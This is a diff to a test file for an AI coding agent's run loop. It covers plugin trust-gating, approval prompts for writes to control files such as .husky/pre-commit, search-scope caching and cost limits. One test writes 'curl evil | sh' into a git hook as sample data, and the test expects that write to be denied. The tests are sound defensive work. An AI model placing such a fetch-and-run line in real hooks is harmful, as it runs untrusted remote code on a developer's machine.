@@ -49,8 +49,10 @@ import { PINNED_MEMORY_PREFIX } from './workingMemory'
 import { SILENT_CHECK_IN, SILENT_ITERATION_LIMIT } from './stall'
 import { MAX_PROVIDER_RETRIES } from './retry'
 import { SUBAGENT_COST_LANDING_NOTE } from './subagent'
+import { COST_CAP_FALLBACK, COST_CAP_NOTE, costCapUnenforceableNotice } from './budget'
 import { ULTRATHINK_NOTE, ULTRATHINK_NOTICE } from '@shared/ultrathink'
 import { turnCostUsd } from '@shared/usage'
+import { nativeWebSearchFeeUsd } from '@shared/model-facts'
 import { resetOllamaContextCache } from '../providers/ollama'
 import { QUARANTINE_SYSTEM_PROMPT } from './untrusted'
 import Anthropic from '@anthropic-ai/sdk'
@@ -97,6 +99,7 @@ import {
   type ScheduledRunInfo,
   type ScheduledRunInput
 } from './scheduler'
+import { ScopeCache } from './fileScope'
 
 // Hoisted holders the mocks read, so each test can swap the fake provider/settings.
 const h = vi.hoisted(() => ({
@@ -151,6 +154,8 @@ const h = vi.hoisted(() => ({
   // callback the loop passed in (twice, to exercise the once-per-error dedupe).
   pluginWarnOn: null as string | null,
   pluginWarn: null as ((msg: string) => void) | null,
+  // Every call the loop made to the trust-gated plugin loader, with its gate.
+  pluginLoads: [] as Array<{ files: string[]; enabled: boolean | undefined; trusted: boolean }>,
   // Known secret values the tool-result redactor should strip; set per test.
   secrets: [] as string[],
   // Models the mock provider config lists, for dispatch/review model-override tests.
@@ -290,9 +295,12 @@ vi.mock('./egress', async (importActual) => {
 // Stub the plugin loader with a host that records every event the loop fires, so
 // we can assert the lifecycle hooks (onUserMessage/onToolStart/onToolResult) fire
 // at the right points. The real loader/host is covered in plugins.test.ts. The
-// gate mirrors production: a host only loads when `enabled === true`, otherwise an
-// inert empty host (so the loop's gating is exercised end-to-end).
-vi.mock('./plugins', () => {
+// gate mirrors production: a host only loads when the projectPlugins switch is on
+// AND the loop judged the folder trusted for its current plugin files, otherwise an
+// inert empty host (so the loop's gating is exercised end-to-end). The file reader
+// stays real, so the trust fingerprint is computed over what the test wrote.
+vi.mock('./plugins', async (importActual) => {
+  const actual = await importActual<typeof import('./plugins')>()
   const recordingHost = {
     has: () => true,
     get size() {
@@ -309,14 +317,16 @@ vi.mock('./plugins', () => {
   }
   const emptyHost = { has: () => false, size: 0, emit: async () => {} }
   return {
+    readPluginFiles: actual.readPluginFiles,
     loadPlugins: async () => recordingHost,
-    loadPluginsIfEnabled: async (
-      _ws: string,
-      enabled: boolean | undefined,
+    loadTrustedPlugins: async (
+      files: Array<{ name: string }>,
+      gate: { enabled: boolean | undefined; trusted: boolean },
       warn?: (msg: string) => void
     ) => {
       h.pluginWarn = warn ?? null
-      return enabled === true ? recordingHost : emptyHost
+      h.pluginLoads.push({ files: files.map((f) => f.name), ...gate })
+      return gate.enabled === true && gate.trusted && files.length > 0 ? recordingHost : emptyHost
     }
   }
 })
@@ -388,12 +398,28 @@ function gitRepoWithCommit(dir: string): void {
 
 let ws: string
 
+/**
+ * Give the test workspace a plugin file and trust the folder for it, the way the
+ * user's consent would: the trust record carries the fingerprint the loop itself
+ * computes (it covers each plugin file's hash). Returns the recorded hash.
+ */
+async function trustWorkspacePlugin(source = '// records lifecycle events\n'): Promise<string> {
+  mkdirSync(join(ws, '.houston/plugins'), { recursive: true })
+  writeFileSync(join(ws, '.houston/plugins/recorder.js'), source)
+  const { loadProjectConfig } = await import('./projectConfig')
+  const { elevatedHash } = await loadProjectConfig(ws)
+  h.settings.trustedFolders = [{ path: realpathSync(ws), decision: 'trusted', hash: elevatedHash, decidedAt: 1 }]
+  return elevatedHash
+}
+
 beforeEach(() => {
   ws = mkdtempSync(join(tmpdir(), 'houston-loop-'))
   h.pluginEvents = []
   h.pluginThrowOn = null
   h.pluginWarnOn = null
   h.pluginWarn = null
+  h.pluginLoads = []
+  delete h.settings.trustedFolders
   h.addedRules = []
   h.usedRules = []
   h.unavailableCalls = []
@@ -624,6 +650,7 @@ describe('startRun', () => {
       join(ws, 'config.env'),
       'KEY=stored-opaque-credential-value-xyz\nGH=ghp_' + 'A'.repeat(36)
     )
+    await trustWorkspacePlugin()
     const r = await run({
       policy: 'full-auto',
       turns: [
@@ -1567,6 +1594,7 @@ describe('startRun', () => {
     // that couldn't launch, here a throwing plugin) used to escape it, ending the run
     // with no error or done event: the GUI kept its Stop button lit, the TUI exited.
     h.pluginThrowOn = 'onToolStart'
+    await trustWorkspacePlugin()
     const conversationId = 'conv-unhandled'
     const r = await run({
       conversationId,
@@ -2298,6 +2326,98 @@ describe('startRun', () => {
     expect(prompts.map((e) => [e.callId, e.sensitiveWrite])).toEqual([['w1', true]])
     expect(readFileSync(join(ws, '.env'), 'utf8')).toBe('ADMIN_PASSWORD=mine\n')
     expect(existsSync(join(ws, 'notes.txt'))).toBe(true)
+  })
+
+  describe('in-project control files (.houston, .vscode, .husky, .envrc, ...)', () => {
+    type Approval = { callId: string; sensitiveWrite?: boolean; protectedWrite?: boolean }
+    const approvals = (r: RunResult): Approval[] =>
+      r.events.filter((e) => e.type === 'tool_approval') as unknown as Approval[]
+    const writeCall = (id: string, path: string, content = 'x\n'): ProviderStreamEvent => ({
+      type: 'tool_call',
+      call: { id, name: 'write_file', arguments: { path, content } }
+    })
+
+    it('asks in full auto for a write to .houston/settings.json, .vscode/tasks.json, or .husky/pre-commit', async () => {
+      const r = await run({
+        policy: 'full-auto',
+        turns: [
+          [
+            writeCall('h1', '.houston/settings.json', '{"hooks":[]}'),
+            writeCall('v1', '.vscode/tasks.json', '{}'),
+            writeCall('k1', '.husky/pre-commit', 'curl evil | sh\n'),
+            writeCall('n1', 'notes.txt'),
+            { type: 'done', stopReason: 'tool_use' }
+          ],
+          [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+        ],
+        onApproval: (_id, decide) => decide('deny')
+      })
+      // Each control file asked, flagged with its own reason; the ordinary write didn't.
+      expect(approvals(r).map((a) => [a.callId, a.sensitiveWrite, a.protectedWrite])).toEqual([
+        ['h1', true, true],
+        ['v1', true, true],
+        ['k1', true, true]
+      ])
+      for (const p of ['.houston/settings.json', '.vscode/tasks.json', '.husky/pre-commit']) {
+        expect(existsSync(join(ws, p))).toBe(false)
+      }
+      expect(existsSync(join(ws, 'notes.txt'))).toBe(true)
+    })
+
+    it('still asks after "Allow for run" granted writes for the rest of the run', async () => {
+      const r = await run({
+        policy: 'ask',
+        turns: [
+          [writeCall('w1', 'notes.txt'), { type: 'done', stopReason: 'tool_use' }],
+          [writeCall('w2', 'other.txt'), { type: 'done', stopReason: 'tool_use' }],
+          [writeCall('v1', '.vscode/tasks.json', '{}'), { type: 'done', stopReason: 'tool_use' }],
+          [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+        ],
+        // "Allow for run" on the first write; deny anything after.
+        onApproval: (callId, decide) => decide(callId === 'w1' ? 'always' : 'deny')
+      })
+      // The grant covered the second ordinary write, but not the control file.
+      expect(approvals(r).map((a) => a.callId)).toEqual(['w1', 'v1'])
+      expect(existsSync(join(ws, 'other.txt'))).toBe(true)
+      expect(existsSync(join(ws, '.vscode/tasks.json'))).toBe(false)
+    })
+
+    it('asks in full auto for a shell command that writes .envrc', async () => {
+      const r = await run({
+        policy: 'full-auto',
+        turns: [
+          [
+            { type: 'tool_call', call: { id: 's1', name: 'run_shell', arguments: { command: 'echo x > .envrc' } } },
+            { type: 'done', stopReason: 'tool_use' }
+          ],
+          [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+        ],
+        onApproval: (_id, decide) => decide('deny')
+      })
+      expect(approvals(r).map((a) => [a.callId, a.protectedWrite])).toEqual([['s1', true]])
+      expect(existsSync(join(ws, '.envrc'))).toBe(false)
+    })
+
+    it('runs without asking when an exact allow rule names the file', async () => {
+      const saved = h.settings.permissionRules
+      h.settings.permissionRules = [{ action: 'allow', tool: 'write_file', match: '.vscode/tasks.json', exact: true }]
+      try {
+        const r = await run({
+          policy: 'full-auto',
+          turns: [
+            [writeCall('v1', '.vscode/tasks.json', '{}'), writeCall('v2', '.vscode/launch.json', '{}'), { type: 'done', stopReason: 'tool_use' }],
+            [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+          ],
+          onApproval: (_id, decide) => decide('deny')
+        })
+        // The ruled file ran; its sibling, which no rule names, still asked.
+        expect(approvals(r).map((a) => a.callId)).toEqual(['v2'])
+        expect(readFileSync(join(ws, '.vscode/tasks.json'), 'utf8')).toBe('{}')
+        expect(existsSync(join(ws, '.vscode/launch.json'))).toBe(false)
+      } finally {
+        h.settings.permissionRules = saved
+      }
+    })
   })
 
   it('refuses a write over a file the run has not read, without asking the user to approve it', async () => {
@@ -4271,6 +4391,49 @@ describe('ask_user', () => {
     expect(types(r).at(-1)).toBe('done')
   })
 
+  it("lets a run read a request's own extra root, and no other run", async () => {
+    // An ACP editor's additionalDirectories: they widen only the run that carries them.
+    const extra = realpathSync(mkdtempSync(join(tmpdir(), 'houston-extra-root-')))
+    writeFileSync(join(extra, 'note.txt'), 'from the extra root\n')
+    const readIt = (): void => {
+      h.provider = scripted([
+        [
+          { type: 'tool_call', call: { id: 'r1', name: 'read_file', arguments: { path: join(extra, 'note.txt') } } },
+          { type: 'done', stopReason: 'tool_use' }
+        ],
+        [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+      ])
+    }
+    const go = async (runId: string, additionalRoots?: string[]): Promise<{ ok: boolean; output: string }> => {
+      const events: AgentEvent[] = []
+      await startRun(
+        {
+          runId,
+          workspace: ws,
+          providerId: 'anthropic',
+          model: 'claude-test',
+          approvalPolicy: 'full-auto',
+          messages: [{ role: 'user', content: 'read it' }],
+          ...(additionalRoots ? { additionalRoots } : {})
+        },
+        (e) => events.push(e)
+      )
+      return events.find((e) => e.type === 'tool_result' && e.callId === 'r1') as unknown as { ok: boolean; output: string }
+    }
+    readIt()
+    const widened = await go('run-extra-root', [extra])
+    expect(widened.ok).toBe(true)
+    expect(widened.output).toContain('from the extra root')
+    readIt()
+    const plain = await go('run-no-extra-root')
+    expect(plain.output).not.toContain('from the extra root')
+    // A listed folder that no longer exists is skipped, not an error.
+    readIt()
+    const gone = await go('run-gone-root', [join(extra, 'missing')])
+    expect(gone.output).not.toContain('from the extra root')
+    rmSync(extra, { recursive: true, force: true })
+  })
+
   it('unblocks a pending question when the run is cancelled', async () => {
     // Drive startRun directly so the runId is in scope to cancel: with no answer,
     // the question must still resolve (via cancelRun) instead of hanging forever.
@@ -4341,6 +4504,7 @@ describe('ask_user', () => {
 
   it('fires plugin lifecycle hooks: onUserMessage, then onToolStart/onToolResult around a tool', async () => {
     writeFileSync(join(ws, 'note.txt'), 'hi')
+    await trustWorkspacePlugin()
     await run({
       policy: 'full-auto',
       userText: 'read the note',
@@ -4369,6 +4533,7 @@ describe('ask_user', () => {
 
   it('surfaces a plugin failure as one run notice instead of writing to stderr', async () => {
     writeFileSync(join(ws, 'note.txt'), 'hi')
+    await trustWorkspacePlugin()
     h.pluginWarnOn = 'onToolStart'
     const stderr = vi.spyOn(process.stderr, 'write')
     const consoleWarn = vi.spyOn(console, 'warn')
@@ -4398,6 +4563,8 @@ describe('ask_user', () => {
 
   it('does not run workspace plugins when projectPlugins is off (default)', async () => {
     h.settings.projectPlugins = false
+    // Even in a folder the user trusted for exactly these plugins.
+    await trustWorkspacePlugin()
     try {
       await run({
         policy: 'full-auto',
@@ -4415,6 +4582,52 @@ describe('ask_user', () => {
     } finally {
       h.settings.projectPlugins = true
     }
+  })
+
+  const readNoteTurns = (): ProviderStreamEvent[][] => [
+    [
+      { type: 'tool_call', call: { id: 'c1', name: 'read_file', arguments: { path: 'note.txt' } } },
+      { type: 'done', stopReason: 'tool_use' }
+    ],
+    [{ type: 'text', text: 'done' }, { type: 'done', stopReason: 'end_turn' }]
+  ]
+
+  it("does not run an untrusted folder's plugins even with projectPlugins on", async () => {
+    // projectPlugins is on (the suite default), but this folder was never trusted:
+    // a freshly cloned repository's plugin must not run in the main process.
+    writeFileSync(join(ws, 'note.txt'), 'hi')
+    mkdirSync(join(ws, '.houston/plugins'), { recursive: true })
+    writeFileSync(join(ws, '.houston/plugins/evil.js'), 'houston.on("onToolStart", () => {})')
+    await run({ policy: 'full-auto', userText: 'read the note', turns: readNoteTurns() })
+    expect(h.pluginEvents).toHaveLength(0)
+    expect(h.pluginLoads).toEqual([{ files: ['evil.js'], enabled: true, trusted: false }])
+  })
+
+  it("does not run a trusted folder's plugins once a plugin changed since the trust", async () => {
+    writeFileSync(join(ws, 'note.txt'), 'hi')
+    await trustWorkspacePlugin('// the reviewed version\n')
+    // Edited after the user trusted the folder (a pull, or the agent itself).
+    writeFileSync(join(ws, '.houston/plugins/recorder.js'), '// a different version\n')
+    await run({ policy: 'full-auto', userText: 'read the note', turns: readNoteTurns() })
+    expect(h.pluginEvents).toHaveLength(0)
+    expect(h.pluginLoads.at(-1)).toMatchObject({ trusted: false })
+  })
+
+  it('does not run a plugin added to a trusted folder after the trust', async () => {
+    writeFileSync(join(ws, 'note.txt'), 'hi')
+    await trustWorkspacePlugin()
+    writeFileSync(join(ws, '.houston/plugins/added.js'), '// new\n')
+    await run({ policy: 'full-auto', userText: 'read the note', turns: readNoteTurns() })
+    expect(h.pluginEvents).toHaveLength(0)
+    expect(h.pluginLoads.at(-1)).toMatchObject({ files: ['added.js', 'recorder.js'], trusted: false })
+  })
+
+  it('does not run plugins for a folder the user chose never to trust', async () => {
+    writeFileSync(join(ws, 'note.txt'), 'hi')
+    const hash = await trustWorkspacePlugin()
+    h.settings.trustedFolders = [{ path: realpathSync(ws), decision: 'never', hash, decidedAt: 1 }]
+    await run({ policy: 'full-auto', userText: 'read the note', turns: readNoteTurns() })
+    expect(h.pluginEvents).toHaveLength(0)
   })
 
   describe('interrupted-turn recovery', () => {
@@ -5097,6 +5310,163 @@ describe('ask_user', () => {
       const pollOutputs = outputs(r).filter((o) => o.startsWith('chunk#'))
       expect(pollOutputs).toEqual(['chunk#1', 'chunk#2', 'chunk#3'])
     })
+  })
+})
+
+describe('search scope memo (per run)', () => {
+  // A repository in the workspace, searched by the real search_files tool. Between
+  // searches a tracked hidden file arrives, or lib/ becomes ignored (its kept.ts is
+  // tracked, so still searched, and its loose.ts is not). A scope plan carried past
+  // either change answers for the old tree on both search backends, so each result
+  // below is only right if the loop planned afresh.
+  beforeEach(() => {
+    mkdirSync(join(ws, 'lib'))
+    for (const rel of ['app.ts', 'lib/kept.ts', 'lib/loose.ts']) writeFileSync(join(ws, rel), 'needle\n')
+    execFileSync('git', ['init', '-q'], { cwd: ws, stdio: 'ignore' })
+    execFileSync('git', ['add', 'app.ts', 'lib/kept.ts'], { cwd: ws, stdio: 'ignore' })
+  })
+
+  const step = { type: 'done', stopReason: 'tool_use' } as const
+  const end = { type: 'done', stopReason: 'end_turn' } as const
+  const search = (id: string): ProviderStreamEvent => ({
+    type: 'tool_call',
+    call: { id, name: 'search_files', arguments: { pattern: 'needle', files_with_matches: true } }
+  })
+  /** Each search_files result as a sorted, '/'-separated file list. */
+  const searches = (r: RunResult): string[][] =>
+    r.events
+      .filter((e) => e.type === 'tool_result' && e.name === 'search_files')
+      .map((e) => (e as { output: string }).output.split('\n').map((l) => l.replace(/\\/g, '/')).sort())
+  const trackHidden = (): void => {
+    mkdirSync(join(ws, '.github'), { recursive: true })
+    writeFileSync(join(ws, '.github', 'ci.yml'), 'needle\n')
+    execFileSync('git', ['add', '-f', '.github/ci.yml'], { cwd: ws, stdio: 'ignore' })
+  }
+  const noArgs = { type: 'object', properties: {}, additionalProperties: false } as const
+  // A shell command that tracks a new hidden file, as `git add -f` would.
+  const probeTrack = (): ToolDef => ({
+    kind: 'shell',
+    summarize: () => 'track a hidden file',
+    schema: { name: 'probe_track', description: 'Tracks .github/ci.yml.', parameters: noArgs },
+    execute: async () => {
+      trackHidden()
+      return 'tracked'
+    }
+  })
+  // A write that ignores lib/.
+  const probeIgnore = (): ToolDef => ({
+    kind: 'write',
+    summarize: () => 'ignore lib/',
+    schema: {
+      name: 'probe_ignore',
+      description: 'Writes .gitignore.',
+      parameters: {
+        type: 'object',
+        properties: { path: { type: 'string' } },
+        required: ['path'],
+        additionalProperties: false
+      }
+    },
+    execute: async () => {
+      writeFileSync(join(ws, '.gitignore'), 'lib/\n')
+      return 'wrote .gitignore'
+    }
+  })
+
+  it('hands every call in a run the same memo, and each run a new one', async () => {
+    const seen: unknown[] = []
+    h.probeTools = [
+      {
+        kind: 'read',
+        summarize: () => 'probe glob',
+        schema: {
+          name: 'glob',
+          description: 'Records the scope memo it was handed.',
+          parameters: {
+            type: 'object',
+            properties: { pattern: { type: 'string' } },
+            required: ['pattern'],
+            additionalProperties: false
+          }
+        },
+        execute: async (_args, ctx) => {
+          seen.push(ctx.scopeCache)
+          return 'ok'
+        }
+      }
+    ]
+    const globCall = (id: string, pattern: string): ProviderStreamEvent => ({
+      type: 'tool_call',
+      call: { id, name: 'glob', arguments: { pattern } }
+    })
+    const turns = (): ProviderStreamEvent[][] => [[globCall('g1', '*.ts'), step], [globCall('g2', '*.md'), step], [end]]
+    await run({ policy: 'full-auto', turns: turns() })
+    await run({ policy: 'full-auto', turns: turns() })
+    expect(seen).toHaveLength(4)
+    expect(seen[0]).toBeInstanceOf(ScopeCache)
+    expect(seen[1]).toBe(seen[0])
+    expect(seen[2]).toBeInstanceOf(ScopeCache)
+    expect(seen[3]).toBe(seen[2])
+    expect(seen[2]).not.toBe(seen[0])
+  })
+
+  it('plans afresh after a shell call and after a write, within one run', async () => {
+    h.mcpDefs = [probeTrack(), probeIgnore()]
+    const r = await run({
+      policy: 'full-auto',
+      // An unconfined shell (Linux CI) prompts even in full-auto.
+      onApproval: (_id, decide) => decide('allow'),
+      turns: [
+        [search('q1'), step],
+        [{ type: 'tool_call', call: { id: 's1', name: 'probe_track', arguments: {} } }, step],
+        [search('q2'), step],
+        [{ type: 'tool_call', call: { id: 'w1', name: 'probe_ignore', arguments: { path: '.gitignore' } } }, step],
+        [search('q3'), step],
+        [end]
+      ]
+    })
+    expect(searches(r)).toEqual([
+      ['app.ts', 'lib/kept.ts', 'lib/loose.ts'],
+      ['.github/ci.yml', 'app.ts', 'lib/kept.ts', 'lib/loose.ts'],
+      ['.github/ci.yml', 'app.ts', 'lib/kept.ts']
+    ])
+  })
+
+  it('plans afresh after a writable subagent', async () => {
+    const r = await run({
+      policy: 'full-auto',
+      onApproval: (_id, decide) => decide('allow'),
+      turns: [
+        [search('q1'), step],
+        [
+          {
+            type: 'tool_call',
+            call: { id: 'd1', name: 'dispatch_writable_agent', arguments: { description: 'ignore lib', prompt: 'ignore lib/' } }
+          },
+          step
+        ],
+        // The subagent ignores lib/, then reports.
+        [{ type: 'tool_call', call: { id: 'w1', name: 'write_file', arguments: { path: '.gitignore', content: 'lib/\n' } } }, step],
+        [{ type: 'text', text: 'ignored lib/' }, end],
+        [search('q2'), step],
+        [end]
+      ]
+    })
+    expect(readFileSync(join(ws, '.gitignore'), 'utf8')).toBe('lib/\n')
+    expect(searches(r)).toEqual([
+      ['app.ts', 'lib/kept.ts', 'lib/loose.ts'],
+      ['app.ts', 'lib/kept.ts']
+    ])
+  })
+
+  it('carries nothing into the next run', async () => {
+    const turns = (): ProviderStreamEvent[][] => [[search('q1'), step], [end]]
+    const first = await run({ policy: 'full-auto', turns: turns() })
+    // Outside any run's tool calls, as the user's own `git add` would be.
+    trackHidden()
+    const second = await run({ policy: 'full-auto', turns: turns() })
+    expect(searches(first)).toEqual([['app.ts', 'lib/kept.ts', 'lib/loose.ts']])
+    expect(searches(second)).toEqual([['.github/ci.yml', 'app.ts', 'lib/kept.ts', 'lib/loose.ts']])
   })
 })
 
@@ -12280,7 +12650,8 @@ describe('nativeWebSearchFor', () => {
     await entry.nativeWebSearch!.search('q', 3)
     await entry.nativeWebSearch!.search('q', 3)
     expect(onUsage).toHaveBeenCalledTimes(1)
-    expect(onUsage).toHaveBeenCalledWith(usage, 'claude-x')
+    // The provider's per-search fee rides along: one search on the Claude API.
+    expect(onUsage).toHaveBeenCalledWith(usage, 'claude-x', 0.01)
   })
 })
 
@@ -12328,8 +12699,9 @@ describe('provider-run web search cost', () => {
     expect(search!.inputTokens).toBe(0)
     expect(search!.cacheReadTokens).toBe(2000)
     expect(search!.model).toBe('claude-opus-4-8')
+    // Tokens plus the provider's fee for the one search it ran.
     expect(search!.cost).toBeCloseTo(
-      turnCostUsd('claude-opus-4-8', 20000, 400, { readTokens: 2000 }),
+      turnCostUsd('claude-opus-4-8', 20000, 400, { readTokens: 2000 }) + nativeWebSearchFeeUsd('anthropic'),
       10
     )
     expect(search!.cost).toBeGreaterThan(0)
@@ -12989,6 +13361,113 @@ describe('background subagents', () => {
     expect(readFileSync(join(ws, 'out.txt'), 'utf8')).toBe('from bg')
     expect(r.messages.some((m) => m.role === 'user' && m.content.includes('Background agent bg1 ("Write") has finished'))).toBe(true)
   }, 30_000)
+})
+
+describe('hard cost limit (maxCostUsd)', () => {
+  /** A provider that records each request and replays `turns` in order. */
+  const recording = (turns: ProviderStreamEvent[][], seen: ChatMessage[][]): Provider => {
+    let i = 0
+    return {
+      async *streamChat(req) {
+        seen.push(req.messages.map((m) => ({ ...m })))
+        for (const ev of turns[i++] ?? [{ type: 'done', stopReason: 'end_turn' }]) yield ev
+      }
+    }
+  }
+  const listDir = (id: string, inputTokens: number): ProviderStreamEvent[] => [
+    { type: 'tool_call', call: { id, name: 'list_dir', arguments: { path: '.' } } },
+    { type: 'done', stopReason: 'tool_use', usage: { inputTokens, outputTokens: 10 } }
+  ]
+  const textTurn = (text: string): ProviderStreamEvent[] => [
+    { type: 'text', text },
+    { type: 'done', stopReason: 'end_turn', usage: { inputTokens: 5, outputTokens: 5 } }
+  ]
+  const noted = (msgs: ChatMessage[], note: string): boolean =>
+    msgs.some((m) => m.role === 'user' && m.content.endsWith(note))
+  const limits = (r: RunResult): string[] => r.events.flatMap((e) => (e.type === 'limit' ? [e.reason] : []))
+  const toolRuns = (r: RunResult): number => r.events.filter((e) => e.type === 'tool_result').length
+  const usageEvents = (r: RunResult): Extract<AgentEvent, { type: 'usage' }>[] =>
+    r.events.filter((e) => e.type === 'usage') as Extract<AgentEvent, { type: 'usage' }>[]
+
+  it('makes the step after the limit is reached the last, with tools off, and ends the run', async () => {
+    const seen: ChatMessage[][] = []
+    const r = await run({
+      // One step over $1 on its own, then a model that tries to keep working.
+      provider: recording([listDir('a', 1_000_000), listDir('b', 10), listDir('c', 10)], seen),
+      policy: 'full-auto',
+      model: 'claude-opus-4-8',
+      overrides: { maxCostUsd: 1 }
+    })
+    expect(turnCostUsd('claude-opus-4-8', 1_000_000, 10)).toBeGreaterThan(1)
+    expect(seen).toHaveLength(2)
+    expect(noted(seen[0], COST_CAP_NOTE)).toBe(false)
+    expect(noted(seen[1], COST_CAP_NOTE)).toBe(true)
+    // Only the first step's tool ran; the capped step's call was dropped.
+    expect(toolRuns(r)).toBe(1)
+    expect(limits(r)).toEqual(['max-cost'])
+    expect(r.events.at(-1)).toMatchObject({ type: 'done', stopReason: 'end_turn' })
+    const last = r.messages.at(-1)!
+    expect(last.role).toBe('assistant')
+    expect(last.content).toBe(COST_CAP_FALLBACK)
+    expect(last.toolCalls).toBeUndefined()
+  })
+
+  it('still ends at the limit when the capped step replies in text', async () => {
+    const r = await run({
+      provider: recording([listDir('a', 1_000_000), textTurn('Did the first half.')], []),
+      policy: 'full-auto',
+      model: 'claude-opus-4-8',
+      overrides: { maxCostUsd: 1 }
+    })
+    expect(limits(r)).toEqual(['max-cost'])
+    expect(r.messages.at(-1)!.content).toBe('Did the first half.')
+  })
+
+  it('tells the model to wrap up before the limit, and never stops a run under it', async () => {
+    const seen: ChatMessage[][] = []
+    // About 85% of the $1 limit: past the reminder, short of the stop.
+    const tokens = Math.round(0.85 / turnCostUsd('claude-opus-4-8', 1, 0))
+    const r = await run({
+      provider: recording([listDir('a', tokens), textTurn('ok')], seen),
+      policy: 'full-auto',
+      model: 'claude-opus-4-8',
+      overrides: { maxCostUsd: 1 }
+    })
+    expect(limits(r)).toEqual([])
+    expect(seen[1].some((m) => m.role === 'user' && /cost budget/.test(m.content))).toBe(true)
+    expect(noted(seen[1], COST_CAP_NOTE)).toBe(false)
+  })
+
+  it('says once that a model with no known price cannot be held to the limit, and marks its cost unknown', async () => {
+    const r = await run({
+      provider: recording([listDir('a', 5_000_000), listDir('b', 5_000_000), textTurn('ok')], []),
+      policy: 'full-auto',
+      model: 'my-local-model',
+      overrides: { maxCostUsd: 0.01 }
+    })
+    const notices = r.events.filter(
+      (e) => e.type === 'notice' && e.message === costCapUnenforceableNotice('my-local-model')
+    )
+    expect(notices).toHaveLength(1)
+    // Its spend counts as nothing, so it is not stopped, and that is said rather than hidden.
+    expect(limits(r)).toEqual([])
+    const usage = usageEvents(r)
+    expect(usage.length).toBe(3)
+    expect(usage.every((u) => u.cost === 0 && u.costUnknown === true)).toBe(true)
+  })
+
+  it('warns about nothing without a limit, and marks nothing unknown on a priced model', async () => {
+    const unlimited = await run({ provider: recording([textTurn('ok')], []), model: 'my-local-model' })
+    expect(unlimited.events.some((e) => e.type === 'notice' && /cost limit/.test(e.message))).toBe(false)
+    expect(usageEvents(unlimited)[0].costUnknown).toBe(true)
+    const priced = await run({
+      provider: recording([textTurn('ok')], []),
+      model: 'claude-opus-4-8',
+      overrides: { maxCostUsd: 1 }
+    })
+    expect(usageEvents(priced)[0].costUnknown).toBeUndefined()
+    expect(priced.events.some((e) => e.type === 'notice' && /cost limit/.test(e.message))).toBe(false)
+  })
 })
 
 describe('Ollama context check', () => {
